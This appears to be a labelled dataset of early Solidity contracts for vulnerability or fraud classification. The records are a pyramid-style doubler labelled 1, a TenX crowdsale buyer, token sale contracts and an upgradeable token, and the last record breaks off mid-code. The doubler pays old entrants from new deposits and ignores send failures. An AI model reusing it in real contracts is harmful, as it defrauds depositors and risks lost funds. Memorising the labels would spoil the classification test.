{"code":"contract quick {\r\r\n\r\r\n  struct Person {\r\r\n      address etherAddress;\r\r\n      uint amount;\r\r\n  }\r\r\n\r\r\n  Person[] public persons;\r\r\n\r\r\n  uint public payoutIdx = 0;\r\r\n  uint public collectedFees;\r\r\n  uint public balance = 0;\r\r\n\r\r\n  address public owner;\r\r\n\r\r\n\r\r\n  modifier onlyowner { if (msg.sender == owner) _ }\r\r\n\r\r\n\r\r\n  function quick() {\r\r\n    owner = msg.sender;\r\r\n  }\r\r\n\r\r\n  function() {\r\r\n    enter();\r\r\n  }\r\r\n  \r\r\n  function enter() {\r\r\n    if (msg.value < 1 ether) {\r\r\n        msg.sender.send(msg.value);\r\r\n        return;\r\r\n    }\r\r\n\t\r\r\n\t\tuint amount;\r\r\n\t\tif (msg.value > 20 ether) {\r\r\n\t\t\tmsg.sender.send(msg.value - 20 ether);\t\r\r\n\t\t\tamount = 20 ether;\r\r\n    }\r\r\n\t\telse {\r\r\n\t\t\tamount = msg.value;\r\r\n\t\t}\r\r\n\r\r\n\r\r\n    uint idx = persons.length;\r\r\n    persons.length += 1;\r\r\n    persons[idx].etherAddress = msg.sender;\r\r\n    persons[idx].amount = amount;\r\r\n \r\r\n    \r\r\n    if (idx != 0) {\r\r\n      collectedFees += amount \/ 10;\r\r\n\t  owner.send(collectedFees);\r\r\n\t  collectedFees = 0;\r\r\n      balance += amount - amount \/ 10;\r\r\n    } \r\r\n    else {\r\r\n      balance += amount;\r\r\n    }\r\r\n\r\r\n\r\r\n    while (balance > persons[payoutIdx].amount \/ 100 * 150) {\r\r\n      uint transactionAmount = persons[payoutIdx].amount \/ 100 * 150;\r\r\n      persons[payoutIdx].etherAddress.send(transactionAmount);\r\r\n\r\r\n      balance -= transactionAmount;\r\r\n      payoutIdx += 1;\r\r\n    }\r\r\n  }\r\r\n\r\r\n\r\r\n  function setOwner(address _owner) onlyowner {\r\r\n      owner = _owner;\r\r\n  }\r\r\n}","label":1}
{"code":"pragma solidity ^0.4.11;\r\r\n\r\r\n\/*\r\r\n\r\r\nTenX Buyer\r\r\n========================\r\r\n\r\r\nBuys TenX tokens from the crowdsale on your behalf.\r\r\nAuthor: \/u\/Cintix\r\r\n\r\r\n*\/\r\r\n\r\r\n\/\/ ERC20 Interface: https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n\/\/ Well, almost.  PAY tokens throw on transfer failure instead of returning false.\r\r\ncontract ERC20 {\r\r\n  function transfer(address _to, uint _value);\r\r\n  function balanceOf(address _owner) constant returns (uint balance);\r\r\n}\r\r\n\r\r\n\/\/ Interface to TenX ICO Contract\r\r\ncontract MainSale {\r\r\n  address public multisigVault;\r\r\n  uint public altDeposits;\r\r\n  function createTokens(address recipient) payable;\r\r\n}\r\r\n\r\r\ncontract TenXBuyer {\r\r\n  \/\/ Store the amount of ETH deposited by each account.\r\r\n  mapping (address => uint) public balances;\r\r\n  \/\/ Store whether or not each account would have made it into the crowdsale.\r\r\n  mapping (address => bool) public checked_in;\r\r\n  \/\/ Bounty for executing buy.\r\r\n  uint256 public bounty;\r\r\n  \/\/ Track whether the contract has bought the tokens yet.\r\r\n  bool public bought_tokens;\r\r\n  \/\/ Record the time the contract bought the tokens.\r\r\n  uint public time_bought;\r\r\n  \/\/ Emergency kill switch in case a critical bug is found.\r\r\n  bool kill_switch;\r\r\n  \r\r\n  \/\/ Hard Cap of TenX Crowdsale\r\r\n  uint hardcap = 200000 ether;\r\r\n  \/\/ Ratio of PAY tokens received to ETH contributed (350 + 20% first-day bonus)\r\r\n  uint pay_per_eth = 420;\r\r\n  \r\r\n  \/\/ The TenX Token Sale address.\r\r\n  MainSale public sale = MainSale(0xd43D09Ec1bC5e57C8F3D0c64020d403b04c7f783);\r\r\n  \/\/ TenX PAY Token Contract address.\r\r\n  ERC20 public token = ERC20(0xB97048628DB6B661D4C2aA833e95Dbe1A905B280);\r\r\n  \/\/ The developer address.\r\r\n  address developer = 0x000Fb8369677b3065dE5821a86Bc9551d5e5EAb9;\r\r\n  \r\r\n  \/\/ Allows the developer to shut down everything except withdrawals in emergencies.\r\r\n  function activate_kill_switch() {\r\r\n    \/\/ Only allow the developer to activate the kill switch.\r\r\n    if (msg.sender != developer) throw;\r\r\n    \/\/ Irreversibly activate the kill switch.\r\r\n    kill_switch = true;\r\r\n  }\r\r\n  \r\r\n  \/\/ Withdraws all ETH deposited or PAY purchased by the sender.\r\r\n  function withdraw(){\r\r\n    \/\/ If called before the ICO, cancel caller&#39;s participation in the sale.\r\r\n    if (!bought_tokens) {\r\r\n      \/\/ Store the user&#39;s balance prior to withdrawal in a temporary variable.\r\r\n      uint eth_amount = balances[msg.sender];\r\r\n      \/\/ Update the user&#39;s balance prior to sending ETH to prevent recursive call.\r\r\n      balances[msg.sender] = 0;\r\r\n      \/\/ Return the user&#39;s funds.  Throws on failure to prevent loss of funds.\r\r\n      msg.sender.transfer(eth_amount);\r\r\n    }\r\r\n    \/\/ Withdraw the sender&#39;s tokens if the contract has already purchased them.\r\r\n    else {\r\r\n      \/\/ Store the user&#39;s PAY balance in a temporary variable (1 ETHWei -> 420 PAYWei).\r\r\n      uint pay_amount = balances[msg.sender] * pay_per_eth;\r\r\n      \/\/ Update the user&#39;s balance prior to sending PAY to prevent recursive call.\r\r\n      balances[msg.sender] = 0;\r\r\n      \/\/ No fee for withdrawing if the user would have made it into the crowdsale alone.\r\r\n      uint fee = 0;\r\r\n      \/\/ 1% fee if the user didn&#39;t check in during the crowdsale.\r\r\n      if (!checked_in[msg.sender]) {\r\r\n        fee = pay_amount \/ 100;\r\r\n      }\r\r\n      \/\/ Send the funds.  Throws on failure to prevent loss of funds.\r\r\n      token.transfer(msg.sender, pay_amount - fee);\r\r\n      token.transfer(developer, fee);\r\r\n    }\r\r\n  }\r\r\n  \r\r\n  \/\/ Allow anyone to contribute to the buy execution bounty.\r\r\n  function add_to_bounty() payable {\r\r\n    \/\/ Disallow adding to bounty if kill switch is active.\r\r\n    if (kill_switch) throw;\r\r\n    \/\/ Disallow adding to the bounty if contract has already bought the tokens.\r\r\n    if (bought_tokens) throw;\r\r\n    \/\/ Update bounty to include received amount.\r\r\n    bounty += msg.value;\r\r\n  }\r\r\n  \r\r\n  \/\/ Buys tokens in the crowdsale and rewards the caller, callable by anyone.\r\r\n  function buy(){\r\r\n    \/\/ Short circuit to save gas if the contract has already bought tokens.\r\r\n    if (bought_tokens) return;\r\r\n    \/\/ Disallow buying into the crowdsale if kill switch is active.\r\r\n    if (kill_switch) throw;\r\r\n    \/\/ Record that the contract has bought the tokens.\r\r\n    bought_tokens = true;\r\r\n    \/\/ Record the time the contract bought the tokens.\r\r\n    time_bought = now;\r\r\n    \/\/ Transfer all the funds (less the bounty) to the TenX crowdsale contract\r\r\n    \/\/ to buy tokens.  Throws if the crowdsale hasn&#39;t started yet or has\r\r\n    \/\/ already completed, preventing loss of funds.\r\r\n    sale.createTokens.value(this.balance - bounty)(address(this));\r\r\n    \/\/ Send the caller their bounty for buying tokens for the contract.\r\r\n    msg.sender.transfer(bounty);\r\r\n  }\r\r\n  \r\r\n  \/\/ A helper function for the default function, allowing contracts to interact.\r\r\n  function default_helper() payable {\r\r\n    \/\/ Treat 0 ETH transactions as check ins and withdrawal requests.\r\r\n    if (msg.value == 0) {\r\r\n      \/\/ Check in during the bonus period.\r\r\n      if (bought_tokens && (now < time_bought + 1 days)) {\r\r\n        \/\/ Only allow checking in before the crowdsale has reached the cap.\r\r\n        if (sale.multisigVault().balance + sale.altDeposits() > hardcap) throw;\r\r\n        \/\/ Mark user as checked in, meaning they would have been able to enter alone.\r\r\n        checked_in[msg.sender] = true;\r\r\n      }\r\r\n      \/\/ Withdraw funds if the crowdsale hasn&#39;t begun yet or if the bonus period is over.\r\r\n      else {\r\r\n        withdraw();\r\r\n      }\r\r\n    }\r\r\n    \/\/ Deposit the user&#39;s funds for use in purchasing tokens.\r\r\n    else {\r\r\n      \/\/ Disallow deposits if kill switch is active.\r\r\n      if (kill_switch) throw;\r\r\n      \/\/ Only allow deposits if the contract hasn&#39;t already purchased the tokens.\r\r\n      if (bought_tokens) throw;\r\r\n      \/\/ Update records of deposited ETH to include the received amount.\r\r\n      balances[msg.sender] += msg.value;\r\r\n    }\r\r\n  }\r\r\n  \r\r\n  \/\/ Default function.  Called when a user sends ETH to the contract.\r\r\n  function () payable {\r\r\n    \/\/ Delegate to the helper function.\r\r\n    default_helper();\r\r\n  }\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.11;\r\r\n\r\r\n\/**\r\r\n * Math operations with safety checks\r\r\n *\/\r\r\nlibrary SafeMath {\r\r\n  function mul(uint256 a, uint256 b) internal returns (uint256) {\r\r\n    uint256 c = a * b;\r\r\n    assert(a == 0 || c \/ a == b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function div(uint256 a, uint256 b) internal returns (uint256) {\r\r\n    \/\/ assert(b > 0); \/\/ Solidity automatically throws when dividing by 0\r\r\n    uint256 c = a \/ b;\r\r\n    \/\/ assert(a == b * c + a % b); \/\/ There is no case in which this doesn&#39;t hold\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function sub(uint256 a, uint256 b) internal returns (uint256) {\r\r\n    assert(b <= a);\r\r\n    return a - b;\r\r\n  }\r\r\n\r\r\n  function add(uint256 a, uint256 b) internal returns (uint256) {\r\r\n    uint256 c = a + b;\r\r\n    assert(c >= a);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function max64(uint64 a, uint64 b) internal constant returns (uint64) {\r\r\n    return a >= b ? a : b;\r\r\n  }\r\r\n\r\r\n  function min64(uint64 a, uint64 b) internal constant returns (uint64) {\r\r\n    return a < b ? a : b;\r\r\n  }\r\r\n\r\r\n  function max256(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    return a >= b ? a : b;\r\r\n  }\r\r\n\r\r\n  function min256(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    return a < b ? a : b;\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\/*\r\r\n * Ownable\r\r\n *\r\r\n * Base contract with an owner.\r\r\n * Provides onlyOwner modifier, which prevents function from running if it is called by anyone other than the owner.\r\r\n *\/\r\r\ncontract Ownable {\r\r\n  address public owner;\r\r\n\r\r\n  function Ownable() {\r\r\n    owner = msg.sender;\r\r\n  }\r\r\n\r\r\n  modifier onlyOwner() {\r\r\n    if (msg.sender != owner) {\r\r\n      throw;\r\r\n    }\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  function transferOwnership(address newOwner) onlyOwner {\r\r\n    if (newOwner != address(0)) {\r\r\n      owner = newOwner;\r\r\n    }\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\/*\r\r\n * Haltable\r\r\n *\r\r\n * Abstract contract that allows children to implement an\r\r\n * emergency stop mechanism. Differs from Pausable by causing a throw when in halt mode.\r\r\n *\r\r\n *\r\r\n * Originally envisioned in FirstBlood ICO contract.\r\r\n *\/\r\r\ncontract Haltable is Ownable {\r\r\n  bool public halted;\r\r\n\r\r\n  modifier stopInEmergency {\r\r\n    if (halted) throw;\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  modifier onlyInEmergency {\r\r\n    if (!halted) throw;\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  \/\/ called by the owner on emergency, triggers stopped state\r\r\n  function halt() external onlyOwner {\r\r\n    halted = true;\r\r\n  }\r\r\n\r\r\n  \/\/ called by the owner on end of emergency, returns to normal state\r\r\n  function unhalt() external onlyOwner onlyInEmergency {\r\r\n    halted = false;\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\/**\r\r\n * @title ERC20Basic\r\r\n * @dev Simpler version of ERC20 interface\r\r\n * @dev see https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n *\/\r\r\ncontract ERC20Basic {\r\r\n  uint256 public totalSupply;\r\r\n  function balanceOf(address who) constant returns (uint256);\r\r\n  function transfer(address to, uint256 value);\r\r\n  event Transfer(address indexed from, address indexed to, uint256 value);\r\r\n}\r\r\n\r\r\n\/**\r\r\n * @title ERC20 interface\r\r\n * @dev see https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n *\/\r\r\ncontract ERC20 is ERC20Basic {\r\r\n  function allowance(address owner, address spender) constant returns (uint256);\r\r\n  function transferFrom(address from, address to, uint256 value);\r\r\n  function approve(address spender, uint256 value);\r\r\n  event Approval(address indexed owner, address indexed spender, uint256 value);\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n * @title Basic token\r\r\n * @dev Basic version of StandardToken, with no allowances. \r\r\n *\/\r\r\ncontract BasicToken is ERC20Basic {\r\r\n  using SafeMath for uint256;\r\r\n\r\r\n  mapping(address => uint256) balances;\r\r\n\r\r\n  \/**\r\r\n   * @dev Fix for the ERC20 short address attack.\r\r\n   *\/\r\r\n  modifier onlyPayloadSize(uint256 size) {\r\r\n     if(msg.data.length < size + 4) {\r\r\n       throw;\r\r\n     }\r\r\n     _;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n  * @dev transfer token for a specified address\r\r\n  * @param _to The address to transfer to.\r\r\n  * @param _value The amount to be transferred.\r\r\n  *\/\r\r\n  function transfer(address _to, uint256 _value) onlyPayloadSize(2 * 32) {\r\r\n    balances[msg.sender] = balances[msg.sender].sub(_value);\r\r\n    balances[_to] = balances[_to].add(_value);\r\r\n    Transfer(msg.sender, _to, _value);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n  * @dev Gets the balance of the specified address.\r\r\n  * @param _owner The address to query the the balance of. \r\r\n  * @return An uint256 representing the amount owned by the passed address.\r\r\n  *\/\r\r\n  function balanceOf(address _owner) constant returns (uint256 balance) {\r\r\n    return balances[_owner];\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\/**\r\r\n * @title Standard ERC20 token\r\r\n *\r\r\n * @dev Implemantation of the basic standart token.\r\r\n * @dev https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n * @dev Based on code by FirstBlood: https:\/\/github.com\/Firstbloodio\/token\/blob\/master\/smart_contract\/FirstBloodToken.sol\r\r\n *\/\r\r\ncontract StandardToken is BasicToken, ERC20 {\r\r\n\r\r\n  mapping (address => mapping (address => uint256)) allowed;\r\r\n\r\r\n\r\r\n  \/**\r\r\n   * @dev Transfer tokens from one address to another\r\r\n   * @param _from address The address which you want to send tokens from\r\r\n   * @param _to address The address which you want to transfer to\r\r\n   * @param _value uint256 the amout of tokens to be transfered\r\r\n   *\/\r\r\n  function transferFrom(address _from, address _to, uint256 _value) onlyPayloadSize(3 * 32) {\r\r\n    var _allowance = allowed[_from][msg.sender];\r\r\n\r\r\n    \/\/ Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\r\r\n    \/\/ if (_value > _allowance) throw;\r\r\n\r\r\n    balances[_to] = balances[_to].add(_value);\r\r\n    balances[_from] = balances[_from].sub(_value);\r\r\n    allowed[_from][msg.sender] = _allowance.sub(_value);\r\r\n    Transfer(_from, _to, _value);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * @dev Aprove the passed address to spend the specified amount of tokens on behalf of msg.sender.\r\r\n   * @param _spender The address which will spend the funds.\r\r\n   * @param _value The amount of tokens to be spent.\r\r\n   *\/\r\r\n  function approve(address _spender, uint256 _value) {\r\r\n\r\r\n    \/\/ To change the approve amount you first have to reduce the addresses`\r\r\n    \/\/  allowance to zero by calling `approve(_spender, 0)` if it is not\r\r\n    \/\/  already 0 to mitigate the race condition described here:\r\r\n    \/\/  https:\/\/github.com\/ethereum\/EIPs\/issues\/20#issuecomment-263524729\r\r\n    if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\r\r\n\r\r\n    allowed[msg.sender][_spender] = _value;\r\r\n    Approval(msg.sender, _spender, _value);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * @dev Function to check the amount of tokens that an owner allowed to a spender.\r\r\n   * @param _owner address The address which owns the funds.\r\r\n   * @param _spender address The address which will spend the funds.\r\r\n   * @return A uint256 specifing the amount of tokens still avaible for the spender.\r\r\n   *\/\r\r\n  function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\r\n    return allowed[_owner][_spender];\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\/**\r\r\n * @title SimpleToken\r\r\n * @dev Very simple ERC20 Token example, where all tokens are pre-assigned to the creator. \r\r\n * Note they can later distribute these tokens as they wish using `transfer` and other\r\r\n * `StandardToken` functions.\r\r\n *\/\r\r\ncontract AhooleeToken is StandardToken {\r\r\n\r\r\n  string public name = \"Ahoolee Token\";\r\r\n  string public symbol = \"AHT\";\r\r\n  uint256 public decimals = 18;\r\r\n  uint256 public INITIAL_SUPPLY = 100000000 * 1 ether;\r\r\n\r\r\n  \/**\r\r\n   * @dev Contructor that gives msg.sender all of existing tokens. \r\r\n   *\/\r\r\n  function AhooleeToken() {\r\r\n    totalSupply = INITIAL_SUPPLY;\r\r\n    balances[msg.sender] = INITIAL_SUPPLY;\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\ncontract AhooleeTokenPreSale is Haltable {\r\r\n    using SafeMath for uint;\r\r\n\r\r\n    string public name = \"Ahoolee Token PreSale\";\r\r\n\r\r\n    AhooleeToken public token;\r\r\n    address public beneficiary;\r\r\n\r\r\n    uint public hardCap;\r\r\n    uint public softCap;\r\r\n    uint public collected;\r\r\n    uint public price;\r\r\n    uint public purchaseLimit;\r\r\n\r\r\n    uint public tokensSold = 0;\r\r\n    uint public weiRaised = 0;\r\r\n    uint public investorCount = 0;\r\r\n    uint public weiRefunded = 0;\r\r\n\r\r\n    uint public startTime;\r\r\n    uint public endTime;\r\r\n\r\r\n    bool public softCapReached = false;\r\r\n    bool public crowdsaleFinished = false;\r\r\n\r\r\n    mapping (address => bool) refunded;\r\r\n\r\r\n    event GoalReached(uint amountRaised);\r\r\n    event SoftCapReached(uint softCap);\r\r\n    event NewContribution(address indexed holder, uint256 tokenAmount, uint256 etherAmount);\r\r\n    event Refunded(address indexed holder, uint256 amount);\r\r\n\r\r\n    modifier onlyAfter(uint time) {\r\r\n        if (now < time) throw;\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    modifier onlyBefore(uint time) {\r\r\n        if (now > time) throw;\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    function AhooleeTokenPreSale(\r\r\n        uint _hardCapUSD,\r\r\n        uint _softCapUSD,\r\r\n        address _token,\r\r\n        address _beneficiary,\r\r\n        uint _totalTokens,\r\r\n        uint _priceETH,\r\r\n        uint _purchaseLimitUSD,\r\r\n\r\r\n        uint _startTime,\r\r\n        uint _duration\r\r\n    ) {\r\r\n        hardCap = _hardCapUSD  * 1 ether \/ _priceETH;\r\r\n        softCap = _softCapUSD * 1 ether \/ _priceETH;\r\r\n        price = _totalTokens * 1 ether \/ hardCap;\r\r\n\r\r\n        purchaseLimit = _purchaseLimitUSD * 1 ether \/ _priceETH * price;\r\r\n        token = AhooleeToken(_token);\r\r\n        beneficiary = _beneficiary;\r\r\n\r\r\n        startTime = _startTime;\r\r\n        endTime = _startTime + _duration * 1 hours;\r\r\n    }\r\r\n\r\r\n    function () payable stopInEmergency{\r\r\n        if (msg.value < 0.01 * 1 ether) throw;\r\r\n        doPurchase(msg.sender);\r\r\n    }\r\r\n\r\r\n    function refund() external onlyAfter(endTime) {\r\r\n        if (softCapReached) throw;\r\r\n        if (refunded[msg.sender]) throw;\r\r\n\r\r\n        uint balance = token.balanceOf(msg.sender);\r\r\n        if (balance == 0) throw;\r\r\n\r\r\n        uint refund = balance \/ price;\r\r\n        if (refund > this.balance) {\r\r\n            refund = this.balance;\r\r\n        }\r\r\n\r\r\n        if (!msg.sender.send(refund)) throw;\r\r\n        refunded[msg.sender] = true;\r\r\n        weiRefunded = weiRefunded.add(refund);\r\r\n        Refunded(msg.sender, refund);\r\r\n    }\r\r\n\r\r\n    function withdraw() onlyOwner {\r\r\n        if (!softCapReached) throw;\r\r\n        if (!beneficiary.send(collected)) throw;\r\r\n        token.transfer(beneficiary, token.balanceOf(this));\r\r\n        crowdsaleFinished = true;\r\r\n    }\r\r\n\r\r\n    function doPurchase(address _owner) private onlyAfter(startTime) onlyBefore(endTime) {\r\r\n        \r\r\n        assert(crowdsaleFinished == false);\r\r\n\r\r\n        if (collected.add(msg.value) > hardCap) throw;\r\r\n\r\r\n        if (!softCapReached && collected < softCap && collected.add(msg.value) >= softCap) {\r\r\n            softCapReached = true;\r\r\n            SoftCapReached(softCap);\r\r\n        }\r\r\n\r\r\n        uint tokens = msg.value * price;\r\r\n        if (token.balanceOf(msg.sender) + tokens > purchaseLimit) throw;\r\r\n\r\r\n        if (token.balanceOf(msg.sender) == 0) investorCount++;\r\r\n      \r\r\n        collected = collected.add(msg.value);\r\r\n\r\r\n        token.transfer(msg.sender, tokens);\r\r\n\r\r\n        weiRaised = weiRaised.add(msg.value);\r\r\n        tokensSold = tokensSold.add(tokens);\r\r\n\r\r\n        NewContribution(_owner, tokens, msg.value);\r\r\n\r\r\n        if (collected == hardCap) {\r\r\n            GoalReached(hardCap);\r\r\n        }\r\r\n    }\r\r\n}","label":0}
{"code":"\/*\r\r\n * ERC20 interface\r\r\n * see https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n *\/\r\r\ncontract ERC20 {\r\r\n  uint public totalSupply;\r\r\n  function balanceOf(address who) constant returns (uint);\r\r\n  function allowance(address owner, address spender) constant returns (uint);\r\r\n\r\r\n  function transfer(address to, uint value) returns (bool ok);\r\r\n  function transferFrom(address from, address to, uint value) returns (bool ok);\r\r\n  function approve(address spender, uint value) returns (bool ok);\r\r\n  event Transfer(address indexed from, address indexed to, uint value);\r\r\n  event Approval(address indexed owner, address indexed spender, uint value);\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * Math operations with safety checks\r\r\n *\/\r\r\ncontract SafeMath {\r\r\n  function safeMul(uint a, uint b) internal returns (uint) {\r\r\n    uint c = a * b;\r\r\n    assert(a == 0 || c \/ a == b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function safeDiv(uint a, uint b) internal returns (uint) {\r\r\n    assert(b > 0);\r\r\n    uint c = a \/ b;\r\r\n    assert(a == b * c + a % b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function safeSub(uint a, uint b) internal returns (uint) {\r\r\n    assert(b <= a);\r\r\n    return a - b;\r\r\n  }\r\r\n\r\r\n  function safeAdd(uint a, uint b) internal returns (uint) {\r\r\n    uint c = a + b;\r\r\n    assert(c>=a && c>=b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function max64(uint64 a, uint64 b) internal constant returns (uint64) {\r\r\n    return a >= b ? a : b;\r\r\n  }\r\r\n\r\r\n  function min64(uint64 a, uint64 b) internal constant returns (uint64) {\r\r\n    return a < b ? a : b;\r\r\n  }\r\r\n\r\r\n  function max256(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    return a >= b ? a : b;\r\r\n  }\r\r\n\r\r\n  function min256(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    return a < b ? a : b;\r\r\n  }\r\r\n\r\r\n  function assert(bool assertion) internal {\r\r\n    if (!assertion) {\r\r\n      throw;\r\r\n    }\r\r\n  }\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * Standard ERC20 token\r\r\n *\r\r\n * https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n * Based on code by FirstBlood:\r\r\n * https:\/\/github.com\/Firstbloodio\/token\/blob\/master\/smart_contract\/FirstBloodToken.sol\r\r\n *\/\r\r\ncontract StandardToken is ERC20, SafeMath {\r\r\n\r\r\n  mapping(address => uint) balances;\r\r\n  mapping (address => mapping (address => uint)) allowed;\r\r\n\r\r\n  function transfer(address _to, uint _value) returns (bool success) {\r\r\n    balances[msg.sender] = safeSub(balances[msg.sender], _value);\r\r\n    balances[_to] = safeAdd(balances[_to], _value);\r\r\n    Transfer(msg.sender, _to, _value);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  function transferFrom(address _from, address _to, uint _value) returns (bool success) {\r\r\n    var _allowance = allowed[_from][msg.sender];\r\r\n\r\r\n    \/\/ Check is not needed because safeSub(_allowance, _value) will already throw if this condition is not met\r\r\n    \/\/ if (_value > _allowance) throw;\r\r\n\r\r\n    balances[_to] = safeAdd(balances[_to], _value);\r\r\n    balances[_from] = safeSub(balances[_from], _value);\r\r\n    allowed[_from][msg.sender] = safeSub(_allowance, _value);\r\r\n    Transfer(_from, _to, _value);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  function balanceOf(address _owner) constant returns (uint balance) {\r\r\n    return balances[_owner];\r\r\n  }\r\r\n\r\r\n  function approve(address _spender, uint _value) returns (bool success) {\r\r\n    allowed[msg.sender][_spender] = _value;\r\r\n    Approval(msg.sender, _spender, _value);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  function allowance(address _owner, address _spender) constant returns (uint remaining) {\r\r\n    return allowed[_owner][_spender];\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * Upgrade agent interface inspired by Lunyr.\r\r\n *\r\r\n * Upgrade agent transfers tokens to a new contract.\r\r\n * Upgrade agent itself can be the token contract, or just a middle man contract doing the heavy lifting.\r\r\n *\/\r\r\ncontract UpgradeAgent {\r\r\n\r\r\n  uint public originalSupply;\r\r\n\r\r\n  \/** Interface marker *\/\r\r\n  function isUpgradeAgent() public constant returns (bool) {\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  function upgradeFrom(address _from, uint256 _value) public;\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n * A token upgrade mechanism where users can opt-in amount of tokens to the next smart contract revision.\r\r\n *\r\r\n * First envisioned by Golem and Lunyr projects.\r\r\n *\/\r\r\ncontract UpgradeableToken is StandardToken {\r\r\n\r\r\n  \/** Contract \/ person who can set the upgrade path. This can be the same as team multisig wallet, as what it is with its default value. *\/\r\r\n  address public upgradeMaster;\r\r\n\r\r\n  \/** The next contract where the tokens will be migrated. *\/\r\r\n  UpgradeAgent public upgradeAgent;\r\r\n\r\r\n  \/** How many tokens we have upgraded by now. *\/\r\r\n  uint256 public totalUpgraded;\r\r\n\r\r\n  \/**\r\r\n   * Upgrade states.\r\r\n   *\r\r\n   * - NotAllowed: The child contract has not reached a condition where the upgrade can bgun\r\r\n   * - WaitingForAgent: Token allows upgrade, but we don&#39;t have a new agent yet\r\r\n   * - ReadyToUpgrade: The agent is set, but not a single token has been upgraded yet\r\r\n   * - Upgrading: Upgrade agent is set and the balance holders can upgrade their tokens\r\r\n   *\r\r\n   *\/\r\r\n  enum UpgradeState {Unknown, NotAllowed, WaitingForAgent, ReadyToUpgrade, Upgrading}\r\r\n\r\r\n  \/**\r\r\n   * Somebody has upgraded some of his tokens.\r\r\n   *\/\r\r\n  event Upgrade(address indexed _from, address indexed _to, uint256 _value);\r\r\n\r\r\n  \/**\r\r\n   * New upgrade agent available.\r\r\n   *\/\r\r\n  event UpgradeAgentSet(address agent);\r\r\n\r\r\n  \/**\r\r\n   * Do not allow construction without upgrade master set.\r\r\n   *\/\r\r\n  function UpgradeableToken(address _upgradeMaster) {\r\r\n    upgradeMaster = _upgradeMaster;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Allow the token holder to upgrade some of their tokens to a new contract.\r\r\n   *\/\r\r\n  function upgrade(uint256 value) public {\r\r\n\r\r\n      UpgradeState state = getUpgradeState();\r\r\n      if(!(state == UpgradeState.ReadyToUpgrade || state == UpgradeState.Upgrading)) {\r\r\n        \/\/ Called in a bad state\r\r\n        throw;\r\r\n      }\r\r\n\r\r\n      \/\/ Validate input value.\r\r\n      if (value == 0) throw;\r\r\n\r\r\n      balances[msg.sender] = safeSub(balances[msg.sender], value);\r\r\n\r\r\n      \/\/ Take tokens out from circulation\r\r\n      totalSupply = safeSub(totalSupply, value);\r\r\n      totalUpgraded = safeAdd(totalUpgraded, value);\r\r\n\r\r\n      \/\/ Upgrade agent reissues the tokens\r\r\n      upgradeAgent.upgradeFrom(msg.sender, value);\r\r\n      Upgrade(msg.sender, upgradeAgent, value);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Set an upgrade agent that handles\r\r\n   *\/\r\r\n  function setUpgradeAgent(address agent) external {\r\r\n\r\r\n      if(!canUpgrade()) {\r\r\n        \/\/ The token is not yet in a state that we could think upgrading\r\r\n        throw;\r\r\n      }\r\r\n\r\r\n      if (agent == 0x0) throw;\r\r\n      \/\/ Only a master can designate the next agent\r\r\n      if (msg.sender != upgradeMaster) throw;\r\r\n      \/\/ Upgrade has already begun for an agent\r\r\n      if (getUpgradeState() == UpgradeState.Upgrading) throw;\r\r\n\r\r\n      upgradeAgent = UpgradeAgent(agent);\r\r\n\r\r\n      \/\/ Bad interface\r\r\n      if(!upgradeAgent.isUpgradeAgent()) throw;\r\r\n      \/\/ Make sure that token supplies match in source and target\r\r\n      if (upgradeAgent.originalSupply() != totalSupply) throw;\r\r\n\r\r\n      UpgradeAgentSet(upgradeAgent);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Get the state of the token upgrade.\r\r\n   *\/\r\r\n  function getUpgradeState() public constant returns(UpgradeState) {\r\r\n    if(!canUpgrade()) return UpgradeState.NotAllowed;\r\r\n    else if(address(upgradeAgent) == 0x00) return UpgradeState.WaitingForAgent;\r\r\n    else if(totalUpgraded == 0) return UpgradeState.ReadyToUpgrade;\r\r\n    else return UpgradeState.Upgrading;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Change the upgrade master.\r\r\n   